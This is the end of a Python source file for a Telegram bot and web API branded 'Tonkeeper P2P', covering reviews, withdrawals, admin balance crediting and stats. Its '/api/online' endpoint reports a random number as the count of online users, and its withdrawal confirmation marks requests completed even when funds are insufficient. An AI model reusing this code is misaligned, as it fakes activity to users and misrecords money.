            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers={'Access-Control-Allow-Origin': '*'})

        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)

        return web.json_response({'success': True, 'review_id': review_id}, headers={'Access-Control-Allow-Origin': '*'})

    # --- УДАЛИТЬ ОТЗЫВ ---
    elif endpoint == '/api/delete_review':
        review_id = data.get('review_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        if review_id in reviews:
            del reviews[review_id]
            save_json(FILES["reviews"], reviews)
            return web.json_response({'success': True}, headers={'Access-Control-Allow-Origin': '*'})
        return web.json_response({'success': False, 'error': 'Review not found'}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ОЧИСТИТЬ ОТЗЫВЫ ---
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ПРОВЕРКА ВЕРИФИКАЦИИ ---
    elif endpoint == '/api/check_verification':
        return web.json_response({'success': True, 'verified': is_verified(user_id)}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ПРОВЕРКА СДЕЛОК ---
    elif endpoint == '/api/check_deals':
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        return web.json_response({'success': True, 'hasDeals': len(user_deals) >= 1}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ЗАЯВКИ НА ВЫВОД (АДМИН) ---
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        pending = [r for r in withdraw_requests.values() if r.get('status') == 'pending']
        return web.json_response({'success': True, 'requests': pending}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ПОДТВЕРДИТЬ ВЫВОД (АДМИН) ---
    elif endpoint == '/api/confirm_withdraw':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers={'Access-Control-Allow-Origin': '*'})

        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers={'Access-Control-Allow-Origin': '*'})

        bal = get_balance(req['user_id'])
        curr_key = req['currency'].lower()
        if bal.get(curr_key, 0) >= req['amount']:
            bal[curr_key] -= req['amount']
            save_json(FILES["balance"], balance)

        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)

        return web.json_response({'success': True}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ОТКЛОНИТЬ ВЫВОД (АДМИН) ---
    elif endpoint == '/api/reject_withdraw':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers={'Access-Control-Allow-Origin': '*'})

        withdraw_requests[request_id]['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)

        return web.json_response({'success': True}, headers={'Access-Control-Allow-Origin': '*'})

    # --- НАЧИСЛИТЬ БАЛАНС (АДМИН) ---
    elif endpoint == '/api/add_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')

        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers={'Access-Control-Allow-Origin': '*'})

        add_balance(target_user_id, currency, float(amount))
        return web.json_response({'success': True}, headers={'Access-Control-Allow-Origin': '*'})

    # --- УПРАВЛЕНИЕ АДМИНАМИ (МАСТЕР) ---
    elif endpoint == '/api/manage_admin':
        target_user_id = data.get('target_user_id')
        action = data.get('action')

        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Master admin only'}, headers={'Access-Control-Allow-Origin': '*'})

        if action == 'add':
            admins[str(target_user_id)] = True
        elif action == 'remove':
            if str(target_user_id) in admins:
                del admins[str(target_user_id)]
        else:
            return web.json_response({'success': False, 'error': 'Invalid action'}, headers={'Access-Control-Allow-Origin': '*'})

        save_json(FILES["admins"], admins)
        return web.json_response({'success': True}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ВСЕ СДЕЛКИ (АДМИН) ---
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers={'Access-Control-Allow-Origin': '*'})
        deals_list = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            deals_list.append(d_copy)
        return web.json_response({'success': True, 'deals': deals_list}, headers={'Access-Control-Allow-Origin': '*'})

    # --- СТАТИСТИКА ---
    elif endpoint == '/api/stats':
        return web.json_response({
            'deals_today': len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))]),
            'users': len(balance),
            'reviews': len(reviews),
            'volume': round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
        }, headers={'Access-Control-Allow-Origin': '*'})

    # --- ОНЛАЙН ---
    elif endpoint == '/api/online':
        import random
        return web.json_response({'online': random.randint(30, 200)}, headers={'Access-Control-Allow-Origin': '*'})

    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers={'Access-Control-Allow-Origin': '*'})

# ============================================================
# 9. ЗАПУСК ВЕБ-СЕРВЕРА
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_post('/{path:.*}', handle_api)

    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

# ============================================================
# 10. ЗАПУСК
# ============================================================
async def main():
    print("=" * 50)
    print("🔥 Tonkeeper P2P Бот + API")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print("=" * 50)

    # Запускаем API сервер
    await start_web_server()

    # Запускаем бота
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
